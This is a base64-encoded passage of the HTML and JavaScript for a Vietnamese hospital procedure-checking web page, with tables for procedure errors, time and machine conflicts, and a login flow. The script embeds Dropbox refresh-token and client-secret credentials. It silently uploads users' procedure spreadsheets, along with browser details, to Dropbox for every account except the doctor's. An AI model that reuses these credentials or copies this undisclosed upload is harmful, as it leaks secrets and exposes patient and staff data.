iZWw+DQogIDxzZWxlY3QgaWQ9ImZpbHRlckRhdGUiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87Ij48L3NlbGVjdD4NCjwvZGl2Pg0KDQogIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUgaGVyYi10YWJsZSI+DQogICAgPHRoZWFkPg0KICAgICAgPHRyPg0KICAgICAgICA8dGg+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgIDx0aD5OZ8OgeTwvdGg+DQogICAgICAgIA0KICAgICAgICA8dGg+S2h1bmcgZ2nhu50gdHLhu5FuZyBideG7lWkgc8Ohbmc8L3RoPg0KICAgICAgICA8dGg+S2h1bmcgZ2nhu50gdHLhu5FuZyBideG7lWkgY2hp4buBdTwvdGg+DQogICAgICA8L3RyPg0KICAgIDwvdGhlYWQ+DQogICAgPHRib2R5IGlkPSJhdmFpbGFiaWxpdHlCb2R5Ij48L3Rib2R5Pg0KICA8L3RhYmxlPg0KPC9kaXY+DQo8IS0tIEvhur5UIFRIw5pDOiBC4bqiTkcgR0nhu5wgVFLhu5BORyBU4buqTkcgTkfGr+G7nEkgLS0+DQoNCg0KDQoNCjwhLS0gTsOaVCBISeG7gk4gVEjhu4ogVEjhu6YgVEhV4bqsVCBT4bquQyBUSFXhu5BDIC0tPg0KDQoNCiAgDQo8IS0tIELhuqJORyBUSOG7piBUSFXhuqxUIFPhuq5DIFRIVeG7kEMgVEhBTkcgLS0+DQo8ZGl2IGlkPSJoZXJiUHJvY2VkdXJlVGFibGUiIHN0eWxlPSJkaXNwbGF5OiBub25lOyBtYXJnaW4tdG9wOiAyMHB4OyI+DQogIDxkaXYgY2xhc3M9Im1haW5ibG9rInN0eWxlPSJtYXJnaW4tYm90dG9tOiAxMHB4OyI+DQogICAgPGRpdj4NCiAgICA8c2VsZWN0IGlkPSJoZXJiRG9jdG9yRmlsdGVyIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvOyBtYXJnaW4tbGVmdDogMjBweDsiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjIGLDoWMgc8SpPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogICAgPHNlbGVjdCBpZD0iaGVyYkRhdGVGaWx0ZXIiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87Ij48L3NlbGVjdD4NCiAgPC9kaXY+PC9kaXY+DQoNCjwhLS0gVMOTTSBU4bquVCBPVVRMSUVSIC0tPg0KPGRpdiBpZD0iaGVyYk91dGxpZXJTdW1tYXJ5IiBzdHlsZT0iZGlzcGxheTpub25lO21hcmdpbjo4cHggMjBweDtmb250LXNpemU6MTRweCI+DQogIDwhLS0gbuG7mWkgZHVuZyBz4bq9IMSRxrDhu6NjIEpTIGPhuq1wIG5o4bqtdCAtLT4NCjwvZGl2Pg0KICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICA8dGhlYWQ+DQogICAgICA8dHI+DQogICAgICAgIDx0aD5I4buNIHTDqm4gYuG7h25oIG5ow6JuPC90aD4NCiAgICAgICAgPHRoPlRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICA8dGg+VGjhu51pIGdpYW48L3RoPg0KICAgICAgICA8dGg+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICA8L3RyPg0KICAgIDwvdGhlYWQ+DQogICAgPHRib2R5IGlkPSJoZXJiVGFibGVCb2R5Ij48L3Rib2R5Pg0KICA8L3RhYmxlPg0KPC9kaXY+DQoNCg0KPCEtLSBQT1BVUCBEQU5IIFPDgUNIIE9VVExJRVIgU+G6rkMgVEhV4buQQyBUSEFORyAtLT4NCjxkaXYgaWQ9ImhlcmJPdXRsaWVyTW9kYWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDt6LWluZGV4OjExMDAwIj4NCiAgPGRpdiBpZD0iaGVyYk91dGxpZXJCYWNrZHJvcCIgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO2luc2V0OjA7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSkiPjwvZGl2Pg0KICA8ZGl2IHJvbGU9ImRpYWxvZyIgYXJpYS1tb2RhbD0idHJ1ZSINCiAgICAgICBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7dG9wOjEwJTtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTsNCiAgICAgICAgICAgICAgbWF4LXdpZHRoOjcwMHB4O21heC1oZWlnaHQ6ODB2aDtvdmVyZmxvdzphdXRvOw0KICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiNmZmY7Y29sb3I6IzAwMDtwYWRkaW5nOjIwcHg7Ym9yZGVyLXJhZGl1czo4cHg7DQogICAgICAgICAgICAgIGJvcmRlcjoycHggc29saWQgI2QzMmYyZjtib3gtc2hhZG93OjAgNXB4IDIwcHggcmdiYSgwLDAsMCwwLjMpO2ZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWYiPg0KICAgIDxoMz5EYW5oIHPDoWNoIGNhIGtow6FjIMSRYSBz4buRPC9oMz4NCiAgICA8ZGl2IHN0eWxlPSJtYXJnaW46MTBweCAwO2ZvbnQtc2l6ZToxM3B4IiBpZD0iaGVyYk91dGxpZXJNb2RhbEluZm8iPjwvZGl2Pg0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiIHN0eWxlPSJtYXJnaW4tdG9wOjEwcHgiPg0KICAgICAgPHRoZWFkPg0KICAgICAgICA8dHI+DQogICAgICAgICAgPHRoPkjhu40gdMOqbiBi4buHbmggbmjDom48L3RoPg0KICAgICAgICAgIDx0aD5UaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICAgIDx0aD5UaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICA8L3RyPg0KICAgICAgPC90aGVhZD4NCiAgICAgIDx0Ym9keSBpZD0iaGVyYk91dGxpZXJNb2RhbEJvZHkiPjwvdGJvZHk+DQogICAgPC90YWJsZT4NCiAgICA8YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgdHlwZT0iYnV0dG9uIiBpZD0iaGVyYk91dGxpZXJDbG9zZUJ0biI+xJDDs25nPC9idXR0b24+DQogIDwvZGl2Pg0KPC9kaXY+DQoNCg0KDQoNCg0KDQo8YnIvPg0KPGJyLz4NCg0KDQo8ZGl2IGlkPSJlcnJvclNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQo8YnIvPg0KPGgzIGlkPSJlcnJvclNlY3Rpb25UaXRsZSI+TOG7l2kgTmjhuq1wIFNhaSBUaOG7nWkgR2lhbjwvaDM+DQo8ZGl2IGlkPSJvcGVyYXRvckZpbHRlckVycm9yIiBzdHlsZT0ibWFyZ2luLXRvcDogMTVweDsgZGlzcGxheTogbm9uZTsiPg0KPGxhYmVsIGZvcj0ib3BlcmF0b3JTZWxlY3RFcnJvciI+TOG7jWMgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQo8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im9wZXJhdG9yU2VsZWN0RXJyb3IiPg0KPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQo8L3NlbGVjdD4NCjwvZGl2Pg0KPGRpdiBpZD0iZXJyb3JMb2ciPjwvZGl2Pg0KPC9kaXY+DQo8YnIvPg0KDQo8ZGl2IGlkPSJyZXN1bHRTZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KPGgzIGlkPSJyZXN1bHRTZWN0aW9uVGl0bGUiPlRyw7luZyBHaeG7nTwvaDM+IA0KDQo8ZGl2IGlkPSJvcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCjxsYWJlbCBmb3I9Im9wZXJhdG9yU2VsZWN0Ij5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCjxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ib3BlcmF0b3JTZWxlY3QiPg0KPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQo8L3NlbGVjdD4NCjwvZGl2Pjxici8+DQoNCjx0YWJsZSBpZD0icmVzdWx0VGFibGUiPg0KPHRoZWFkPg0KPHRyPg0KPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQo8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCjx0aD48aSBjbGFzcz0iZmFyIGZhLWNhbGVuZGFyLWFsdCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfDoHk8L3RoPg0KPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIj48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCjx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEfhu6NpIMO9IGdp4budPC90aD4NCjwvdHI+DQo8L3RoZWFkPg0KPHRib2R5IGlkPSJyZXN1bHRCb2R5Ij48L3Rib2R5Pg0KPC90YWJsZT4NCg0KDQo8L2Rpdj4NCjwhLS0gQuG6ok5HIEfhuq5OIFNBSSBNw4FZIC0tPg0KPGRpdiBpZD0ibWFjaGluZUVycm9yU2VjdGlvbiIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCiAgPGJyLz4NCiAgPGgzIGlkPSJtYWNoaW5lRXJyb3JTZWN0aW9uVGl0bGUiPkfhuq9uIFNhaSBNw6MgTcOheTwvaDM+DQogIDxkaXYgaWQ9Im1hY2hpbmVPcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCiAgICA8bGFiZWwgZm9yPSJtYWNoaW5lT3BlcmF0b3JTZWxlY3QiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KICAgIDxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ibWFjaGluZU9wZXJhdG9yU2VsZWN0Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICA8L2Rpdj4NCiAgPGRpdiBpZD0ibWFjaGluZUVycm9yTG9nIj48L2Rpdj4NCjwvZGl2Pg0KPGJyLz4NCg0KPCEtLSBC4bqiTkcgWFVORyDEkOG7mFQgTcOBWSAtLT4NCjxkaXYgaWQ9Im1hY2hpbmVDb25mbGljdFNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogIDxici8+DQogIDxoMyBpZD0ibWFjaGluZUNvbmZsaWN0U2VjdGlvblRpdGxlIj5YdW5nIMSQ4buZdCBNw6F5PC9oMz4NCiAgPGRpdiBpZD0ibWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXIiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQogICAgPGxhYmVsIGZvcj0ibWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KICAgIDxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ibWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogIDwvZGl2Pg0KICA8ZGl2IGlkPSJtYWNoaW5lQ29uZmxpY3RMb2ciPjwvZGl2Pg0KPC9kaXY+DQo8YnIvPg0KPCEtLSBC4bqiTkcgUVXDik4gR+G6rk4gTcODIE3DgVkgLS0+DQo8ZGl2IGlkPSJtaXNzaW5nTWFjaGluZVNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogIDxici8+DQogIDxoMyBpZD0ibWlzc2luZ01hY2hpbmVTZWN0aW9uVGl0bGUiPlF1w6puIEfhuq9uIE3DoyBNw6F5PC9oMz4NCiAgPGRpdiBpZD0ibWlzc2luZ01hY2hpbmVPcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCiAgICA8bGFiZWwgZm9yPSJtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0Ij5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCiAgICA8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im1pc3NpbmdNYWNoaW5lT3BlcmF0b3JTZWxlY3QiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogIDwvZGl2Pg0KICA8ZGl2IGlkPSJtaXNzaW5nTWFjaGluZUxvZyI+PC9kaXY+DQo8L2Rpdj4NCjxici8+DQoNCjwvZGl2Pg0KPC9kaXY+DQo8c2NyaXB0Pg0KLy8gVOG6o2kgWExTWCBjaOG7iSBraGkgY+G6p24NCmFzeW5jIGZ1bmN0aW9uIGVuc3VyZVhMU1goKSB7DQogIGlmICghd2luZG93LlhMU1gpIHsNCiAgICBhd2FpdCBpbXBvcnQoJ2h0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL3hsc3gvMC4xOC41L3hsc3guZnVsbC5taW4uanMnKTsNCiAgfQ0KfQ0KDQovLyBU4bqjaSBEcm9wYm94IFNESyBjaOG7iSBraGkgY+G6p24NCmFzeW5jIGZ1bmN0aW9uIGVuc3VyZURyb3Bib3goKSB7DQogIGlmICghd2luZG93LkRyb3Bib3gpIHsNCiAgICBhd2FpdCBpbXBvcnQoJ2h0dHBzOi8vdW5wa2cuY29tL2Ryb3Bib3gvZGlzdC9Ecm9wYm94LXNkay5taW4uanMnKTsNCiAgfQ0KfQ0KDQoNCiAgICAgICAgLy8gRGFuaCBzw6FjaCB0aOG7pyB0aHXhuq10DQogICAgICAgbGV0IFBST0NFRFVSRVMgPSB7fTsNCg0KYXN5bmMgZnVuY3Rpb24gbG9hZFByb2NlZHVyZXMoKSB7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9jaGF1X3RodXRodWF0LnR4dCcpOw0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgcmVzLnRleHQoKTsNCiAgICAgICAgUFJPQ0VEVVJFUyA9IEpTT04ucGFyc2UodGV4dCk7DQogICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgIGFsZXJ0KCdLaMO0bmcgdGjhu4MgdOG6o2kgZGFuaCBzw6FjaCB0aOG7pyB0aHXhuq10OiAnICsgZXJyLm1lc3NhZ2UpOw0KICAgICAgICBjb25zb2xlLmVycm9yKGVycik7DQogICAgfQ0KfQ0KDQoJCQ0KDQogICAgICAgIC8vIEJp4bq/biB0b8OgbiBj4bulYw0KICAgICAgICBsZXQgZXJyb3JMb2cgPSBbXTsNCiAgICAgICAgbGV0IGN1cnJlbnRVc2VyID0gbnVsbDsNCiAgICAgICAgbGV0IGFsbFByb2NlZHVyZXMgPSBbXTsNCiAgICAgICAvLyBCaeG6v24gY2hvIGtp4buDbSB0cmEgbcOheQ0KICAgICAgICBsZXQgbWFjaGluZUVycm9yTG9nID0gW107DQogICAgICAgIGxldCBtYWNoaW5lQ29uZmxpY3RMb2cgPSBbXTsNCgkJbGV0IG1pc3NpbmdNYWNoaW5lTG9nID0gW107DQogICAgICAgIC8vID09PSBL4bq+VCBUSMOaQyBDT0RFIE3hu5pJID09PQ0KDQpjb25zdCBEUk9QQk9YX0NPTkZJRyA9IHsNCiAgICByZWZyZXNoVG9rZW46ICJjdGdCdmozSXN0Y0FBQUFBQUFBQUFWRkNzSVhJdXpfQ1RRcEltYWtjQzRjdVFWOER1bWtmZ0RXSXM4VkdQdkZUIiwNCiAgICBjbGllbnRJZDogInc4YXdqMnF4bzNhaXY1ZSIsDQogICAgY2xpZW50U2VjcmV0OiAicWtxbzF1N2F0czdibDlnIg0KfTsNCg0KYXN5bmMgZnVuY3Rpb24gZ2V0QWNjZXNzVG9rZW4oKSB7DQogICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgiaHR0cHM6Ly9hcGkuZHJvcGJveGFwaS5jb20vb2F1dGgyL3Rva2VuIiwgew0KICAgICAgICBtZXRob2Q6ICJQT1NUIiwNCiAgICAgICAgaGVhZGVyczogew0KICAgICAgICAgICAgIkF1dGhvcml6YXRpb24iOiAiQmFzaWMgIiArIGJ0b2EoYCR7RFJPUEJPWF9DT05GSUcuY2xpZW50SWR9OiR7RFJPUEJPWF9DT05GSUcuY2xpZW50U2VjcmV0fWApLA0KICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiDQogICAgICAgIH0sDQogICAgICAgIGJvZHk6IGBncmFudF90eXBlPXJlZnJlc2hfdG9rZW4mcmVmcmVzaF90b2tlbj0ke0RST1BCT1hfQ09ORklHLnJlZnJlc2hUb2tlbn1gDQogICAgfSk7DQogICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsNCiAgICByZXR1cm4gZGF0YS5hY2Nlc3NfdG9rZW47DQp9DQovLyBU4bqjaSBYTFNYIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlWExTWCgpIHsNCiAgaWYgKCF3aW5kb3cuWExTWCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMveGxzeC8wLjE4LjUveGxzeC5mdWxsLm1pbi5qcycpOw0KICB9DQp9DQoNCi8vIFThuqNpIERyb3Bib3ggU0RLIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlRHJvcGJveCgpIHsNCiAgaWYgKCF3aW5kb3cuRHJvcGJveCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly91bnBrZy5jb20vZHJvcGJveC9kaXN0L0Ryb3Bib3gtc2RrLm1pbi5qcycpOw0KICB9DQp9DQphc3luYyBmdW5jdGlvbiB1cGxvYWRUb0Ryb3Bib3goZmlsZSwga2hvYVZhbHVlLCBuZ2F5VmFsdWUsIHN0YXRzID0geyBoZXJiOiAwLCB0aW1lOiAwLCBjb25mbGljdDogMCB9KSB7DQogY29uc3QgY3VycmVudFVzZXIgPSBzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJyk7DQogIGlmIChjdXJyZW50VXNlciAmJiBjdXJyZW50VXNlci50b0xvd2VyQ2FzZSgpID09PSAnZG9jdG9yJykgew0KICAgIHJldHVybjsgDQogIH0NCiAgYXdhaXQgZW5zdXJlRHJvcGJveCgpOyAvLyDEkeG6o20gYuG6o28gY8OzIERyb3Bib3ggU0RLDQogICAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICAgIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCg0KICAgIGNvbnN0IHBjTmFtZSA9IG5hdmlnYXRvci51c2VyQWdlbnQ7DQogICAgY29uc3Qgbm93ID0gbmV3IERhdGUoKS50b0xvY2FsZVN0cmluZygndmktVk4nKTsNCiAgICBjb25zdCBmaWxlbmFtZSA9IGAke2ZpbGUubmFtZS5yZXBsYWNlKC9cLlteLy5dKyQvLCAiIil9XyR7RGF0ZS5ub3coKX0ueGxzeGA7DQoNCiAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGRieC5maWxlc1VwbG9hZCh7DQogICAgICAgIHBhdGg6IGAvdGh1dGh1YXQvJHtmaWxlbmFtZX1gLA0KICAgICAgICBjb250ZW50czogZmlsZSwNCiAgICAgICAgbW9kZTogJ2FkZCcsDQogICAgICAgIGF1dG9yZW5hbWU6IHRydWUNCiAgICB9KTsNCg0KICAgIC8vIEdoaSBtZXRhZGF0YSB2w6BvIGZpbGUgSlNPTiB0cnVuZyB0w6JtIChk4bqhbmcgdGV4dCBhcHBlbmQpDQogICAgY29uc3QgbWV0YWRhdGEgPSB7DQogICAgICAgIHN0dDogRGF0ZS5ub3coKSwNCiAgICBraG9hOiBraG9hVmFsdWUsICAgICAgICAvLyDinIUgxJHDum5nIGJp4bq/bg0KICAgIG5nYXk6IG5nYXlWYWx1ZSwgICAgLy8g4pyFIMSRw7puZyBiaeG6v24NCiAgICAgICAgbGluazogImh0dHBzOi8vd3d3LmRyb3Bib3guY29tL2hvbWUvdGh1dGh1YXQ/cHJldmlldz0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGZpbGVuYW1lKSwNCiAgICAgICAgcGM6IHBjTmFtZSwNCiAgICAgICAgdGltZTogbm93LA0KCQloZXJiX2Vycm9yczogTnVtYmVyKHN0YXRzLmhlcmIpIHx8IDAsDQogICAgdGltZV9lcnJvcnM6IE51bWJlcihzdGF0cy50aW1lKSB8fCAwLA0KICAgY29uZmxpY3RfZXJyb3JzOiBOdW1iZXIoc3RhdHMuY29uZmxpY3QpIHx8IDANCiAgICB9Ow0KDQogICAgYXdhaXQgYXBwZW5kRHJvcGJveExvZyhtZXRhZGF0YSk7DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIGFwcGVuZERyb3Bib3hMb2cobG9nSXRlbSkgew0KICAgIGNvbnN0IGFjY2Vzc1Rva2VuID0gYXdhaXQgZ2V0QWNjZXNzVG9rZW4oKTsNCiAgICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQoNCiAgICBjb25zdCBsb2dQYXRoID0gJy90aHV0aHVhdC9sb2cuanNvbic7DQogICAgbGV0IGxvZ3MgPSBbXTsNCg0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiBsb2dQYXRoIH0pOw0KICAgICAgICBjb25zdCBibG9iID0gcmVzcG9uc2UucmVzdWx0LmZpbGVCbG9iOyAvLyDinIUgZMO5bmcgLnJlc3VsdC5maWxlQmxvYg0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgYmxvYi50ZXh0KCk7DQogICAgICAgIGxvZ3MgPSBKU09OLnBhcnNlKHRleHQpOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgY29uc29sZS53YXJuKCJLaMO0bmcgdMOsbSB0aOG6pXkgbG9nLmpzb24gY8WpIGhv4bq3YyBs4buXaSDEkeG7jWM6IiwgZSk7DQogICAgICAgIGxvZ3MgPSBbXTsNCiAgICB9DQoNCiAgICAvLyBDaMOobiBt4bubaSBuaOG6pXQgbMOqbiDEkeG6p3UNCiAgICBsb2dzLnVuc2hpZnQobG9nSXRlbSk7DQoNCiAgICBhd2FpdCBkYnguZmlsZXNVcGxvYWQoew0KICAgICAgICBwYXRoOiBsb2dQYXRoLA0KICAgICAgICBjb250ZW50czogSlNPTi5zdHJpbmdpZnkobG9ncywgbnVsbCwgMiksDQogICAgICAgIG1vZGU6IHsgJy50YWcnOiAnb3ZlcndyaXRlJyB9LCAvLyDinIUgR2hpIMSRw6ggYuG6r3QgYnXhu5ljDQogICAgICAgIGF1dG9yZW5hbWU6IGZhbHNlDQogICAgfSk7DQp9DQoNCg0KYXN5bmMgZnVuY3Rpb24gaW5pdEFmdGVyTG9naW4oKSB7DQogIGF3YWl0IFByb21pc2UuYWxsKFsNCiAgICBsb2FkUHJvY2VkdXJlcygpLA0KICAgIGxvYWRDb25mbGljdFJ1bGVzKCkNCiAgXSk7DQp9DQoNCg0KDQogICAgICAgIC8vID09PT09PT09PT0gUEjhuqZOIMSQxIJORyBOSOG6rFAgPT09PT09PT09PSAvLw0KYXN5bmMgZnVuY3Rpb24gY2hlY2tTYXZlZExvZ2luKCkgew0KICAgIGNvbnN0IHNhdmVkVXNlciA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKTsNCiAgICBpZiAoc2F2ZWRVc2VyKSB7DQogICAgICAgIGN1cnJlbnRVc2VyID0gc2F2ZWRVc2VyOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIGluaXRBZnRlckxvZ2luKCk7IC8vIGF1dG8tbG9naW4gbeG7m2kgbG9hZCBk4buvIGxp4buHdQ0KICAgIH0NCn0NCg0KbGV0IGlzTG9naW5BY3Rpb24gPSBmYWxzZTsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCmxldCBhbmFseXplUG9wdXBUaW1lcjsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCmFzeW5jIGZ1bmN0aW9uIGNoZWNrTG9naW4oKSB7DQogIGNvbnN0IGJ0bkxvZ2luICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKTsNCiAgY29uc3QgdXNlcm5hbWUgICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUudHJpbSgpOw0KICBjb25zdCBwYXNzd29yZCAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS52YWx1ZS50cmltKCk7DQogIGNvbnN0IGxvZ2luRXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5FcnJvcicpOw0KDQogIGJ0bkxvZ2luLmRpc2FibGVkID0gdHJ1ZTsNCiAgYnRuTG9naW4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIj48L2k+IMSQYW5nIMSRxINuZyBuaOG6rXAuLi4nOw0KDQogIGNvbnN0IHBvcHVwICAgICAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogIGxldCBsb2dpblBvcHVwU2hvd24gPSBmYWxzZTsNCg0KICAvLyBTYXUgMnMga2nhu4NtIHRyYTogduG6q24g4bufIHRyYW5nIMSRxINuZyBuaOG6rXAgJiDEkWFuZyBsb2FkaW5nPw0KY29uc3Qgc2xvd0xvZ2luVGltZXIgPSBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICBpZiAoIWlzTG9naW5BY3Rpb24pIHJldHVybjsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCiAgICBjb25zdCBsb2dpblNlY3Rpb25WaXNpYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJzsNCiAgICBjb25zdCBzdGlsbExvYWRpbmcgPSBidG5Mb2dpbi5pbm5lckhUTUwuaW5jbHVkZXMoJ8SQYW5nIMSRxINuZyBuaOG6rXAnKTsNCiAgICBpZiAobG9naW5TZWN0aW9uVmlzaWJsZSAmJiBzdGlsbExvYWRpbmcpIHsNCiAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zYXRlbGxpdGUtZGlzaCBmYS1zcGluIiBzdHlsZT0iZm9u